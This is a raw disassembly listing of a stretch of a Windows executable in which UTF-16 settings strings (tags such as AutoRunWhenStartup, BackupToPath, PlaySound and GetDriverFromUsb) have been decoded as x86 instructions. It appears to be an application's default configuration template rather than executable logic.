  40340c:	add    BYTE PTR [ebp+0x0],ah
  40340f:	cmp    al,0x0
  403411:	das    
  403412:	add    BYTE PTR [ebp+0x0],dl
  403415:	jo     0x403417
  403417:	ins    BYTE PTR es:[edi],dx
  403418:	add    BYTE PTR [edi+0x0],ch
  40341b:	popa   
  40341c:	add    BYTE PTR [eax+eax*1+0x48],ah
  403420:	add    BYTE PTR [ecx+0x0],ah
  403423:	jb     0x403425
  403425:	add    BYTE PTR fs:[edi+0x0],dh
  403429:	popa   
  40342a:	add    BYTE PTR [edx+0x0],dh
  40342d:	add    BYTE PTR gs:[ecx+0x0],cl
  403431:	outs   dx,BYTE PTR ds:[esi]
  403432:	add    BYTE PTR [esi+0x0],ah
  403435:	outs   dx,DWORD PTR ds:[esi]
  403436:	add    BYTE PTR [esi],bh
  403438:	add    BYTE PTR [eax],al
  40343a:	sbb    DWORD PTR [eax+eax*1],edi
  40343d:	dec    esp
  40343e:	add    BYTE PTR [ecx+0x0],ah
  403441:	outs   dx,BYTE PTR ds:[esi]
  403442:	add    BYTE PTR [edi+0x0],ah
  403445:	jne    0x403447
  403447:	popa   
  403448:	add    BYTE PTR [edi+0x0],ah
  40344b:	add    BYTE PTR gs:[eax],ah
  40344e:	add    BYTE PTR [edi],ch
  403450:	add    BYTE PTR [esi],bh
  403452:	add    BYTE PTR [eax],al
  403454:	adc    eax,0x4c003c
  403459:	popa   
  40345a:	add    BYTE PTR [esi+0x0],ch
  40345d:	add    BYTE PTR [di+0x0],dh
  403461:	popa   
  403462:	add    BYTE PTR [edi+0x0],ah
  403465:	add    BYTE PTR gs:[esi],bh
  403468:	add    BYTE PTR [eax],al
  40346a:	pop    ss
  40346b:	cmp    al,0x0
  40346d:	das    
  40346e:	add    BYTE PTR [eax+eax*1+0x61],cl
  403472:	add    BYTE PTR [esi+0x0],ch
  403475:	add    BYTE PTR [di+0x0],dh
  403479:	popa   
  40347a:	add    BYTE PTR [edi+0x0],ah
  40347d:	add    BYTE PTR gs:[esi],bh
  403480:	add    BYTE PTR [eax],al
  403482:	pop    edi
  403483:	cmp    al,0x0
  403485:	push   ebx
  403486:	add    BYTE PTR [eax+0x0],ch
  403489:	outs   dx,DWORD PTR ds:[esi]
  40348a:	add    BYTE PTR [edi+0x0],dh
  40348d:	push   edx
  40348e:	add    BYTE PTR [ebp+0x0],ah
  403491:	jae    0x403493
  403493:	je     0x403495
  403495:	outs   dx,DWORD PTR ds:[esi]
  403496:	add    BYTE PTR [edx+0x0],dh
  403499:	add    BYTE PTR gs:[esi+0x0],cl
  40349d:	add    BYTE PTR gs:[eax+0x0],bh
  4034a1:	je     0x4034a3
  4034a3:	push   esp
  4034a4:	add    BYTE PTR [ecx+0x0],ch
  4034a7:	ins    DWORD PTR es:[edi],dx
  4034a8:	add    BYTE PTR [ebp+0x0],ah
  4034ab:	add    BYTE PTR ds:[eax+eax*1+0x72],dh
  4034b0:	add    BYTE PTR [ebp+0x0],dh
  4034b3:	add    BYTE PTR gs:[eax+eax*1],bh
  4034b7:	das    
  4034b8:	add    BYTE PTR [ebx+0x0],dl
  4034bb:	push   0x77006f00
  4034c0:	add    BYTE PTR [edx+0x0],dl
  4034c3:	add    BYTE PTR gs:[ebx+0x0],dh
  4034c7:	je     0x4034c9
  4034c9:	outs   dx,DWORD PTR ds:[esi]
  4034ca:	add    BYTE PTR [edx+0x0],dh
  4034cd:	add    BYTE PTR gs:[esi+0x0],cl
  4034d1:	add    BYTE PTR gs:[eax+0x0],bh
  4034d5:	je     0x4034d7
  4034d7:	push   esp
  4034d8:	add    BYTE PTR [ecx+0x0],ch
  4034db:	ins    DWORD PTR es:[edi],dx
  4034dc:	add    BYTE PTR [ebp+0x0],ah
  4034df:	add    BYTE PTR ds:[eax],al
  4034e2:	popa   
  4034e3:	cmp    al,0x0
  4034e5:	push   ebx
  4034e6:	add    BYTE PTR [eax+0x0],ch
  4034e9:	outs   dx,DWORD PTR ds:[esi]
  4034ea:	add    BYTE PTR [edi+0x0],dh
  4034ed:	push   edx
  4034ee:	add    BYTE PTR [ebp+0x0],ah
  4034f1:	jae    0x4034f3
  4034f3:	je     0x4034f5
  4034f5:	outs   dx,DWORD PTR ds:[esi]
  4034f6:	add    BYTE PTR [edx+0x0],dh
  4034f9:	add    BYTE PTR gs:[esi+0x0],cl
  4034fd:	add    BYTE PTR gs:[eax+0x0],bh
  403501:	je     0x403503
  403503:	push   esp
  403504:	add    BYTE PTR [ecx+0x0],ch
  403507:	ins    DWORD PTR es:[edi],dx
  403508:	add    BYTE PTR [ebp+0x0],ah
  40350b:	add    BYTE PTR ds:[esi+0x0],ah
  40350f:	popa   
  403510:	add    BYTE PTR [eax+eax*1+0x73],ch
  403514:	add    BYTE PTR [ebp+0x0],ah
  403517:	cmp    al,0x0
  403519:	das    
  40351a:	add    BYTE PTR [ebx+0x0],dl
  40351d:	push   0x77006f00
  403522:	add    BYTE PTR [edx+0x0],dl
  403525:	add    BYTE PTR gs:[ebx+0x0],dh
  403529:	je     0x40352b
  40352b:	outs   dx,DWORD PTR ds:[esi]
  40352c:	add    BYTE PTR [edx+0x0],dh
  40352f:	add    BYTE PTR gs:[esi+0x0],cl
  403533:	add    BYTE PTR gs:[eax+0x0],bh
  403537:	je     0x403539
  403539:	push   esp
  40353a:	add    BYTE PTR [ecx+0x0],ch
  40353d:	ins    DWORD PTR es:[edi],dx
  40353e:	add    BYTE PTR [ebp+0x0],ah
  403541:	add    BYTE PTR ds:[eax],al
  403544:	arpl   WORD PTR [eax+eax*1],di
  403547:	inc    ecx
  403548:	add    BYTE PTR [ebp+0x0],dh
  40354b:	je     0x40354d
  40354d:	outs   dx,DWORD PTR ds:[esi]
  40354e:	add    BYTE PTR [ebx+0x0],dl
  403551:	arpl   WORD PTR [eax],ax
  403553:	popa   
  403554:	add    BYTE PTR [esi+0x0],ch
  403557:	push   edi
  403558:	add    BYTE PTR [eax+0x0],ch
  40355b:	add    BYTE PTR gs:[esi+0x0],ch
  40355f:	dec    esp
  403560:	add    BYTE PTR [ecx+0x0],ah
  403563:	jne    0x403565
  403565:	outs   dx,BYTE PTR ds:[esi]
  403566:	add    BYTE PTR [ebx+0x0],ah
  403569:	push   0x64006500
  40356e:	add    BYTE PTR [esi],bh
  403570:	add    BYTE PTR [eax+eax*1+0x72],dh
  403574:	add    BYTE PTR [ebp+0x0],dh
  403577:	add    BYTE PTR gs:[eax+eax*1],bh
  40357b:	das    
  40357c:	add    BYTE PTR [ecx+0x0],al
  40357f:	jne    0x403581
  403581:	je     0x403583
  403583:	outs   dx,DWORD PTR ds:[esi]
  403584:	add    BYTE PTR [ebx+0x0],dl
  403587:	arpl   WORD PTR [eax],ax
  403589:	popa   
  40358a:	add    BYTE PTR [esi+0x0],ch
  40358d:	push   edi
  40358e:	add    BYTE PTR [eax+0x0],ch
  403591:	add    BYTE PTR gs:[esi+0x0],ch
  403595:	dec    esp
  403596:	add    BYTE PTR [ecx+0x0],ah
  403599:	jne    0x40359b
  40359b:	outs   dx,BYTE PTR ds:[esi]
  40359c:	add    BYTE PTR [ebx+0x0],ah
  40359f:	push   0x64006500
  4035a4:	add    BYTE PTR [esi],bh
  4035a6:	add    BYTE PTR [eax],al
  4035a8:	gs cmp al,0x0
  4035ab:	inc    ecx
  4035ac:	add    BYTE PTR [ebp+0x0],dh
  4035af:	je     0x4035b1
  4035b1:	outs   dx,DWORD PTR ds:[esi]
  4035b2:	add    BYTE PTR [ebx+0x0],dl
  4035b5:	arpl   WORD PTR [eax],ax
  4035b7:	popa   
  4035b8:	add    BYTE PTR [esi+0x0],ch
  4035bb:	push   edi
  4035bc:	add    BYTE PTR [eax+0x0],ch
  4035bf:	add    BYTE PTR gs:[esi+0x0],ch
  4035c3:	dec    esp
  4035c4:	add    BYTE PTR [ecx+0x0],ah
  4035c7:	jne    0x4035c9
  4035c9:	outs   dx,BYTE PTR ds:[esi]
  4035ca:	add    BYTE PTR [ebx+0x0],ah
  4035cd:	push   0x64006500
  4035d2:	add    BYTE PTR [esi],bh
  4035d4:	add    BYTE PTR [esi+0x0],ah
  4035d7:	popa   
  4035d8:	add    BYTE PTR [eax+eax*1+0x73],ch
  4035dc:	add    BYTE PTR [ebp+0x0],ah
  4035df:	cmp    al,0x0
  4035e1:	das    
  4035e2:	add    BYTE PTR [ecx+0x0],al
  4035e5:	jne    0x4035e7
  4035e7:	je     0x4035e9
  4035e9:	outs   dx,DWORD PTR ds:[esi]
  4035ea:	add    BYTE PTR [ebx+0x0],dl
  4035ed:	arpl   WORD PTR [eax],ax
  4035ef:	popa   
  4035f0:	add    BYTE PTR [esi+0x0],ch
  4035f3:	push   edi
  4035f4:	add    BYTE PTR [eax+0x0],ch
  4035f7:	add    BYTE PTR gs:[esi+0x0],ch
  4035fb:	dec    esp
  4035fc:	add    BYTE PTR [ecx+0x0],ah
  4035ff:	jne    0x403601
  403601:	outs   dx,BYTE PTR ds:[esi]
  403602:	add    BYTE PTR [ebx+0x0],ah
  403605:	push   0x64006500
  40360a:	add    BYTE PTR [esi],bh
  40360c:	add    BYTE PTR [eax],al
  40360e:	push   ebx
  40360f:	cmp    al,0x0
  403611:	inc    ecx
  403612:	add    BYTE PTR [ebp+0x0],dh
  403615:	je     0x403617
  403617:	outs   dx,DWORD PTR ds:[esi]
  403618:	add    BYTE PTR [edx+0x0],dl
  40361b:	jne    0x40361d
  40361d:	outs   dx,BYTE PTR ds:[esi]
  40361e:	add    BYTE PTR [edi+0x0],dl
  403621:	push   0x6e006500
  403626:	add    BYTE PTR [ebx+0x0],dl
  403629:	je     0x40362b
  40362b:	popa   
  40362c:	add    BYTE PTR [edx+0x0],dh
  40362f:	je     0x403631
  403631:	add    BYTE PTR ds:[eax+eax*1+0x72],dh
  403636:	add    BYTE PTR [ebp+0x0],dh
  403639:	add    BYTE PTR gs:[eax+eax*1],bh
  40363d:	das    
  40363e:	add    BYTE PTR [ecx+0x0],al
  403641:	jne    0x403643
  403643:	je     0x403645
  403645:	outs   dx,DWORD PTR ds:[esi]
  403646:	add    BYTE PTR [edx+0x0],dl
  403649:	jne    0x40364b
  40364b:	outs   dx,BYTE PTR ds:[esi]
  40364c:	add    BYTE PTR [edi+0x0],dl
  40364f:	push   0x6e006500
  403654:	add    BYTE PTR [ebx+0x0],dl
  403657:	je     0x403659
  403659:	popa   
  40365a:	add    BYTE PTR [edx+0x0],dh
  40365d:	je     0x40365f
  40365f:	add    BYTE PTR ds:[eax],al
  403662:	push   ebp
  403663:	cmp    al,0x0
  403665:	inc    ecx
  403666:	add    BYTE PTR [ebp+0x0],dh
  403669:	je     0x40366b
  40366b:	outs   dx,DWORD PTR ds:[esi]
  40366c:	add    BYTE PTR [edx+0x0],dl
  40366f:	jne    0x403671
  403671:	outs   dx,BYTE PTR ds:[esi]
  403672:	add    BYTE PTR [edi+0x0],dl
  403675:	push   0x6e006500
  40367a:	add    BYTE PTR [ebx+0x0],dl
  40367d:	je     0x40367f
  40367f:	popa   
  403680:	add    BYTE PTR [edx+0x0],dh
  403683:	je     0x403685
  403685:	add    BYTE PTR ds:[esi+0x0],ah
  403689:	popa   
  40368a:	add    BYTE PTR [eax+eax*1+0x73],ch
  40368e:	add    BYTE PTR [ebp+0x0],ah
  403691:	cmp    al,0x0
  403693:	das    
  403694:	add    BYTE PTR [ecx+0x0],al
  403697:	jne    0x403699
  403699:	je     0x40369b
  40369b:	outs   dx,DWORD PTR ds:[esi]
  40369c:	add    BYTE PTR [edx+0x0],dl
  40369f:	jne    0x4036a1
  4036a1:	outs   dx,BYTE PTR ds:[esi]
  4036a2:	add    BYTE PTR [edi+0x0],dl
  4036a5:	push   0x6e006500
  4036aa:	add    BYTE PTR [ebx+0x0],dl
  4036ad:	je     0x4036af
  4036af:	popa   
  4036b0:	add    BYTE PTR [edx+0x0],dh
  4036b3:	je     0x4036b5
  4036b5:	add    BYTE PTR ds:[eax],al
  4036b8:	pop    edi
  4036b9:	cmp    al,0x0
  4036bb:	inc    edx
  4036bc:	add    BYTE PTR [ecx+0x0],ah
  4036bf:	arpl   WORD PTR [eax],ax
  4036c1:	imul   eax,DWORD PTR [eax],0x75
  4036c4:	add    BYTE PTR [eax+0x0],dh
  4036c7:	inc    ecx
  4036c8:	add    BYTE PTR [ebp+0x0],dh
  4036cb:	je     0x4036cd
  4036cd:	outs   dx,DWORD PTR ds:[esi]
  4036ce:	add    BYTE PTR [ebx+0x0],dl
  4036d1:	add    BYTE PTR gs:[eax+eax*1+0x65],ch
  4036d6:	add    BYTE PTR [ebx+0x0],ah
  4036d9:	je     0x4036db
  4036db:	inc    ecx
  4036dc:	add    BYTE PTR [eax+eax*1+0x6c],ch
  4036e0:	add    BYTE PTR [esi],bh
  4036e2:	add    BYTE PTR [eax+eax*1+0x72],dh
  4036e6:	add    BYTE PTR [ebp+0x0],dh
  4036e9:	add    BYTE PTR gs:[eax+eax*1],bh
  4036ed:	das    
  4036ee:	add    BYTE PTR [edx+0x0],al
  4036f1:	popa   
  4036f2:	add    BYTE PTR [ebx+0x0],ah
  4036f5:	imul   eax,DWORD PTR [eax],0x75
  4036f8:	add    BYTE PTR [eax+0x0],dh
  4036fb:	inc    ecx
  4036fc:	add    BYTE PTR [ebp+0x0],dh
  4036ff:	je     0x403701
  403701:	outs   dx,DWORD PTR ds:[esi]
  403702:	add    BYTE PTR [ebx+0x0],dl
  403705:	add    BYTE PTR gs:[eax+eax*1+0x65],ch
  40370a:	add    BYTE PTR [ebx+0x0],ah
  40370d:	je     0x40370f
  40370f:	inc    ecx
  403710:	add    BYTE PTR [eax+eax*1+0x6c],ch
  403714:	add    BYTE PTR [esi],bh
  403716:	add    BYTE PTR [eax],al
  403718:	popa   
  403719:	cmp    al,0x0
  40371b:	inc    edx
  40371c:	add    BYTE PTR [ecx+0x0],ah
  40371f:	arpl   WORD PTR [eax],ax
  403721:	imul   eax,DWORD PTR [eax],0x75
  403724:	add    BYTE PTR [eax+0x0],dh
  403727:	inc    ecx
  403728:	add    BYTE PTR [ebp+0x0],dh
  40372b:	je     0x40372d
  40372d:	outs   dx,DWORD PTR ds:[esi]
  40372e:	add    BYTE PTR [ebx+0x0],dl
  403731:	add    BYTE PTR gs:[eax+eax*1+0x65],ch
  403736:	add    BYTE PTR [ebx+0x0],ah
  403739:	je     0x40373b
  40373b:	inc    ecx
  40373c:	add    BYTE PTR [eax+eax*1+0x6c],ch
  403740:	add    BYTE PTR [esi],bh
  403742:	add    BYTE PTR [esi+0x0],ah
  403745:	popa   
  403746:	add    BYTE PTR [eax+eax*1+0x73],ch
  40374a:	add    BYTE PTR [ebp+0x0],ah
  40374d:	cmp    al,0x0
  40374f:	das    
  403750:	add    BYTE PTR [edx+0x0],al
  403753:	popa   
  403754:	add    BYTE PTR [ebx+0x0],ah
  403757:	imul   eax,DWORD PTR [eax],0x75
  40375a:	add    BYTE PTR [eax+0x0],dh
  40375d:	inc    ecx
  40375e:	add    BYTE PTR [ebp+0x0],dh
  403761:	je     0x403763
  403763:	outs   dx,DWORD PTR ds:[esi]
  403764:	add    BYTE PTR [ebx+0x0],dl
  403767:	add    BYTE PTR gs:[eax+eax*1+0x65],ch
  40376c:	add    BYTE PTR [ebx+0x0],ah
  40376f:	je     0x403771
  403771:	inc    ecx
  403772:	add    BYTE PTR [eax+eax*1+0x6c],ch
  403776:	add    BYTE PTR [esi],bh
  403778:	add    BYTE PTR [eax],al
  40377a:	and    DWORD PTR [eax+eax*1],edi
  40377d:	inc    edx
  40377e:	add    BYTE PTR [ecx+0x0],ah
  403781:	arpl   WORD PTR [eax],ax
  403783:	imul   eax,DWORD PTR [eax],0x75
  403786:	add    BYTE PTR [eax+0x0],dh
  403789:	push   esp
  40378a:	add    BYTE PTR [edi+0x0],ch
  40378d:	push   eax
  40378e:	add    BYTE PTR [ecx+0x0],ah
  403791:	je     0x403793
  403793:	push   0x2f002000
  403798:	add    BYTE PTR [esi],bh
  40379a:	add    BYTE PTR [eax],al
  40379c:	sbb    eax,0x42003c
  4037a1:	popa   
  4037a2:	add    BYTE PTR [ebx+0x0],ah
  4037a5:	imul   eax,DWORD PTR [eax],0x75
  4037a8:	add    BYTE PTR [eax+0x0],dh
  4037ab:	push   esp
  4037ac:	add    BYTE PTR [edi+0x0],ch
  4037af:	push   eax
  4037b0:	add    BYTE PTR [ecx+0x0],ah
  4037b3:	je     0x4037b5
  4037b5:	push   0x3e00
  4037ba:	pop    ds
  4037bb:	cmp    al,0x0
  4037bd:	das    
  4037be:	add    BYTE PTR [edx+0x0],al
  4037c1:	popa   
  4037c2:	add    BYTE PTR [ebx+0x0],ah
  4037c5:	imul   eax,DWORD PTR [eax],0x75
  4037c8:	add    BYTE PTR [eax+0x0],dh
  4037cb:	push   esp
  4037cc:	add    BYTE PTR [edi+0x0],ch
  4037cf:	push   eax
  4037d0:	add    BYTE PTR [ecx+0x0],ah
  4037d3:	je     0x4037d5
  4037d5:	push   0x3e00
  4037da:	aaa    
  4037db:	cmp    al,0x0
  4037dd:	push   eax
  4037de:	add    BYTE PTR [eax+eax*1+0x61],ch
  4037e2:	add    BYTE PTR [ecx+0x0],bh
  4037e5:	push   ebx
  4037e6:	add    BYTE PTR [edi+0x0],ch
  4037e9:	jne    0x4037eb
  4037eb:	outs   dx,BYTE PTR ds:[esi]
  4037ec:	add    BYTE PTR [eax+eax*1+0x3e],ah
  4037f0:	add    BYTE PTR [eax+eax*1+0x72],dh
  4037f4:	add    BYTE PTR [ebp+0x0],dh
  4037f7:	add    BYTE PTR gs:[eax+eax*1],bh
  4037fb:	das    
  4037fc:	add    BYTE PTR [eax+0x0],dl
  4037ff:	ins    BYTE PTR es:[edi],dx
  403800:	add    BYTE PTR [ecx+0x0],ah
  403803:	jns    0x403805
  403805:	push   ebx
  403806:	add    BYTE PTR [edi+0x0],ch
  403809:	jne    0x40380b
  40380b:	outs   dx,BYTE PTR ds:[esi]
  40380c:	add    BYTE PTR [eax+eax*1+0x3e],ah
  403810:	add    BYTE PTR [eax],al
  403812:	cmp    DWORD PTR [eax+eax*1],edi
  403815:	push   eax
  403816:	add    BYTE PTR [eax+eax*1+0x61],ch
  40381a:	add    BYTE PTR [ecx+0x0],bh
  40381d:	push   ebx
  40381e:	add    BYTE PTR [edi+0x0],ch
  403821:	jne    0x403823
  403823:	outs   dx,BYTE PTR ds:[esi]
  403824:	add    BYTE PTR [eax+eax*1+0x3e],ah
  403828:	add    BYTE PTR [esi+0x0],ah
  40382b:	popa   
  40382c:	add    BYTE PTR [eax+eax*1+0x73],ch
  403830:	add    BYTE PTR [ebp+0x0],ah
  403833:	cmp    al,0x0
  403835:	das    
  403836:	add    BYTE PTR [eax+0x0],dl
  403839:	ins    BYTE PTR es:[edi],dx
  40383a:	add    BYTE PTR [ecx+0x0],ah
  40383d:	jns    0x40383f
  40383f:	push   ebx
  403840:	add    BYTE PTR [edi+0x0],ch
  403843:	jne    0x403845
  403845:	outs   dx,BYTE PTR ds:[esi]
  403846:	add    BYTE PTR [eax+eax*1+0x3e],ah
  40384a:	add    BYTE PTR [eax],al
  40384c:	push   edi
  40384d:	cmp    al,0x0
  40384f:	push   ebx
  403850:	add    BYTE PTR [eax+0x0],ch
  403853:	outs   dx,DWORD PTR ds:[esi]
  403854:	add    BYTE PTR [edi+0x0],dh
  403857:	push   ebx
  403858:	add    BYTE PTR [eax+0x0],ch
  40385b:	popa   
  40385c:	add    BYTE PTR [edx+0x0],dh
  40385f:	add    BYTE PTR gs:[esi+0x0],cl
  403863:	add    BYTE PTR gs:[eax+0x0],bh
  403867:	je     0x403869
  403869:	push   esp
  40386a:	add    BYTE PTR [ecx+0x0],ch
  40386d:	ins    DWORD PTR es:[edi],dx
  40386e:	add    BYTE PTR [ebp+0x0],ah
  403871:	add    BYTE PTR ds:[eax+eax*1+0x72],dh
  403876:	add    BYTE PTR [ebp+0x0],dh
  403879:	add    BYTE PTR gs:[eax+eax*1],bh
  40387d:	das    
  40387e:	add    BYTE PTR [ebx+0x0],dl
  403881:	push   0x77006f00
  403886:	add    BYTE PTR [ebx+0x0],dl
  403889:	push   0x72006100
  40388e:	add    BYTE PTR [ebp+0x0],ah
  403891:	dec    esi
  403892:	add    BYTE PTR [ebp+0x0],ah
  403895:	js     0x403897
  403897:	je     0x403899
  403899:	push   esp
  40389a:	add    BYTE PTR [ecx+0x0],ch
  40389d:	ins    DWORD PTR es:[edi],dx
  40389e:	add    BYTE PTR [ebp+0x0],ah
  4038a1:	add    BYTE PTR ds:[eax],al
  4038a4:	pop    ecx
  4038a5:	cmp    al,0x0
  4038a7:	push   ebx
  4038a8:	add    BYTE PTR [eax+0x0],ch
  4038ab:	outs   dx,DWORD PTR ds:[esi]
  4038ac:	add    BYTE PTR [edi+0x0],dh
  4038af:	push   ebx
  4038b0:	add    BYTE PTR [eax+0x0],ch
  4038b3:	popa   
  4038b4:	add    BYTE PTR [edx+0x0],dh
  4038b7:	add    BYTE PTR gs:[esi+0x0],cl
  4038bb:	add    BYTE PTR gs:[eax+0x0],bh
  4038bf:	je     0x4038c1
  4038c1:	push   esp
  4038c2:	add    BYTE PTR [ecx+0x0],ch
  4038c5:	ins    DWORD PTR es:[edi],dx
  4038c6:	add    BYTE PTR [ebp+0x0],ah
  4038c9:	add    BYTE PTR ds:[esi+0x0],ah
  4038cd:	popa   
  4038ce:	add    BYTE PTR [eax+eax*1+0x73],ch
  4038d2:	add    BYTE PTR [ebp+0x0],ah
  4038d5:	cmp    al,0x0
  4038d7:	das    
  4038d8:	add    BYTE PTR [ebx+0x0],dl
  4038db:	push   0x77006f00
  4038e0:	add    BYTE PTR [ebx+0x0],dl
  4038e3:	push   0x72006100
  4038e8:	add    BYTE PTR [ebp+0x0],ah
  4038eb:	dec    esi
  4038ec:	add    BYTE PTR [ebp+0x0],ah
  4038ef:	js     0x4038f1
  4038f1:	je     0x4038f3
  4038f3:	push   esp
  4038f4:	add    BYTE PTR [ecx+0x0],ch
  4038f7:	ins    DWORD PTR es:[edi],dx
  4038f8:	add    BYTE PTR [ebp+0x0],ah
  4038fb:	add    BYTE PTR ds:[eax],al
  4038fe:	jnp    0x40393c
  403900:	add    BYTE PTR [edi+0x0],al
  403903:	add    BYTE PTR gs:[eax+eax*1+0x44],dh
  403908:	add    BYTE PTR [edx+0x0],dh
  40390b:	imul   eax,DWORD PTR [eax],0x650076
  403911:	jb     0x403913
  403913:	inc    esi
  403914:	add    BYTE PTR [edx+0x0],dh
  403917:	outs   dx,DWORD PTR ds:[esi]
  403918:	add    BYTE PTR [ebp+0x0],ch
  40391b:	push   edi
  40391c:	add    BYTE PTR [ecx+0x0],ch
  40391f:	outs   dx,BYTE PTR ds:[esi]
  403920:	add    BYTE PTR [eax+eax*1+0x6f],ah
  403924:	add    BYTE PTR [edi+0x0],dh
  403927:	jae    0x403929
  403929:	push   ebp
  40392a:	add    BYTE PTR [eax+0x0],dh
  40392d:	add    BYTE PTR fs:[ecx+0x0],ah
  403931:	je     0x403933
  403933:	add    BYTE PTR gs:[esi],bh
  403936:	add    BYTE PTR [eax+eax*1+0x72],dh
  40393a:	add    BYTE PTR [ebp+0x0],dh
  40393d:	add    BYTE PTR gs:[eax+eax*1],bh
  403941:	das    
  403942:	add    BYTE PTR [edi+0x0],al
  403945:	add    BYTE PTR gs:[eax+eax*1+0x44],dh
  40394a:	add    BYTE PTR [edx+0x0],dh
  40394d:	imul   eax,DWORD PTR [eax],0x650076
  403953:	jb     0x403955
  403955:	inc    esi
  403956:	add    BYTE PTR [edx+0x0],dh
  403959:	outs   dx,DWORD PTR ds:[esi]
  40395a:	add    BYTE PTR [ebp+0x0],ch
  40395d:	push   edi
  40395e:	add    BYTE PTR [ecx+0x0],ch
  403961:	outs   dx,BYTE PTR ds:[esi]
  403962:	add    BYTE PTR [eax+eax*1+0x6f],ah
  403966:	add    BYTE PTR [edi+0x0],dh
  403969:	jae    0x40396b
  40396b:	push   ebp
  40396c:	add    BYTE PTR [eax+0x0],dh
  40396f:	add    BYTE PTR fs:[ecx+0x0],ah
  403973:	je     0x403975
  403975:	add    BYTE PTR gs:[esi],bh
  403978:	add    BYTE PTR [eax],al
  40397a:	jge    0x4039b8
  40397c:	add    BYTE PTR [edi+0x0],al
  40397f:	add    BYTE PTR gs:[eax+eax*1+0x44],dh
  403984:	add    BYTE PTR [edx+0x0],dh
  403987:	imul   eax,DWORD PTR [eax],0x650076
  40398d:	jb     0x40398f
  40398f:	inc    esi
  403990:	add    BYTE PTR [edx+0x0],dh
  403993:	outs   dx,DWORD PTR ds:[esi]
  403994:	add    BYTE PTR [ebp+0x0],ch
  403997:	push   edi
  403998:	add    BYTE PTR [ecx+0x0],ch
  40399b:	outs   dx,BYTE PTR ds:[esi]
  40399c:	add    BYTE PTR [eax+eax*1+0x6f],ah
  4039a0:	add    BYTE PTR [edi+0x0],dh
  4039a3:	jae    0x4039a5
  4039a5:	push   ebp
  4039a6:	add    BYTE PTR [eax+0x0],dh
  4039a9:	add    BYTE PTR fs:[ecx+0x0],ah
  4039ad:	je     0x4039af
  4039af:	add    BYTE PTR gs:[esi],bh
  4039b2:	add    BYTE PTR [esi+0x0],ah
  4039b5:	popa   
  4039b6:	add    BYTE PTR [eax+eax*1+0x73],ch
  4039ba:	add    BYTE PTR [ebp+0x0],ah
  4039bd:	cmp    al,0x0
  4039bf:	das    
  4039c0:	add    BYTE PTR [edi+0x0],al
  4039c3:	add    BYTE PTR gs:[eax+eax*1+0x44],dh
  4039c8:	add    BYTE PTR [edx+0x0],dh
  4039cb:	imul   eax,DWORD PTR [eax],0x650076
  4039d1:	jb     0x4039d3
  4039d3:	inc    esi
  4039d4:	add    BYTE PTR [edx+0x0],dh
  4039d7:	outs   dx,DWORD PTR ds:[esi]
  4039d8:	add    BYTE PTR [ebp+0x0],ch
  4039db:	push   edi
  4039dc:	add    BYTE PTR [ecx+0x0],ch
  4039df:	outs   dx,BYTE PTR ds:[esi]
  4039e0:	add    BYTE PTR [eax+eax*1+0x6f],ah
  4039e4:	add    BYTE PTR [edi+0x0],dh
  4039e7:	jae    0x4039e9
  4039e9:	push   ebp
  4039ea:	add    BYTE PTR [eax+0x0],dh
  4039ed:	add    BYTE PTR fs:[ecx+0x0],ah
  4039f1:	je     0x4039f3
  4039f3:	add    BYTE PTR gs:[esi],bh
  4039f6:	add    BYTE PTR [eax],al
  4039f8:	push   ebx
  4039f9:	cmp    al,0x0
  4039fb:	dec    ecx
  4039fc:	add    BYTE PTR [ebx+0x0],dh
  4039ff:	inc    esi
  403a00:	add    BYTE PTR [ecx+0x0],ch
  403a03:	jb     0x403a05
  403a05:	jae    0x403a07
  403a07:	je     0x403a09
  403a09:	inc    ebx
  403a0a:	add    BYTE PTR [eax+eax*1+0x69],ch
  403a0e:	add    BYTE PTR [ebx+0x0],ah
  403a11:	imul   eax,DWORD PTR [eax],0x47
  403a14:	add    BYTE PTR [ecx+0x0],ch
  403a17:	data16 add BYTE PTR [eax+eax*1+0x3e],dh
  403a1c:	add    BYTE PTR [eax+eax*1+0x72],dh
  403a20:	add    BYTE PTR [ebp+0x0],dh
  403a23:	add    BYTE PTR gs:[eax+eax*1],bh
  403a27:	das    
  403a28:	add    BYTE PTR [ecx+0x0],cl
  403a2b:	jae    0x403a2d
  403a2d:	inc    esi
  403a2e:	add    BYTE PTR [ecx+0x0],ch
  403a31:	jb     0x403a33
  403a33:	jae    0x403a35
  403a35:	je     0x403a37
  403a37:	inc    ebx
  403a38:	add    BYTE PTR [eax+eax*1+0x69],ch
  403a3c:	add    BYTE PTR [ebx+0x0],ah
  403a3f:	imul   eax,DWORD PTR [eax],0x47
  403a42:	add    BYTE PTR [ecx+0x0],ch
  403a45:	data16 add BYTE PTR [eax+eax*1+0x3e],dh
  403a4a:	add    BYTE PTR [eax],al
  403a4c:	push   ebp
  403a4d:	cmp    al,0x0
  403a4f:	dec    ecx
  403a50:	add    BYTE PTR [ebx+0x0],dh
  403a53:	inc    esi
  403a54:	add    BYTE PTR [ecx+0x0],ch
  403a57:	jb     0x403a59
  403a59:	jae    0x403a5b
  403a5b:	je     0x403a5d
  403a5d:	inc    ebx
  403a5e:	add    BYTE PTR [eax+eax*1+0x69],ch
  403a62:	add    BYTE PTR [ebx+0x0],ah
  403a65:	imul   eax,DWORD PTR [eax],0x47
  403a68:	add    BYTE PTR [ecx+0x0],ch
  403a6b:	data16 add BYTE PTR [eax+eax*1+0x3e],dh
  403a70:	add    BYTE PTR [esi+0x0],ah
  403a73:	popa   
  403a74:	add    BYTE PTR [eax+eax*1+0x73],ch
  403a78:	add    BYTE PTR [ebp+0x0],ah
  403a7b:	cmp    al,0x0
  403a7d:	das    
  403a7e:	add    BYTE PTR [ecx+0x0],cl
  403a81:	jae    0x403a83
  403a83:	inc    esi
  403a84:	add    BYTE PTR [ecx+0x0],ch
  403a87:	jb     0x403a89
  403a89:	jae    0x403a8b
  403a8b:	je     0x403a8d
  403a8d:	inc    ebx
  403a8e:	add    BYTE PTR [eax+eax*1+0x69],ch
  403a92:	add    BYTE PTR [ebx+0x0],ah
  403a95:	imul   eax,DWORD PTR [eax],0x47
  403a98:	add    BYTE PTR [ecx+0x0],ch
  403a9b:	data16 add BYTE PTR [eax+eax*1+0x3e],dh
  403aa0:	add    BYTE PTR [eax],al
  403aa2:	pop    ss
  403aa3:	cmp    al,0x0
  403aa5:	das    
  403aa6:	add    BYTE PTR [ebx+0x0],dl
  403aa9:	add    BYTE PTR gs:[eax+eax*1+0x74],dh
  403aae:	add    BYTE PTR [ecx+0x0],ch
  403ab1:	outs   dx,BYTE PTR ds:[esi]
  403ab2:	add    BYTE PTR [edi+0x0],ah
  403ab5:	jae    0x403ab7
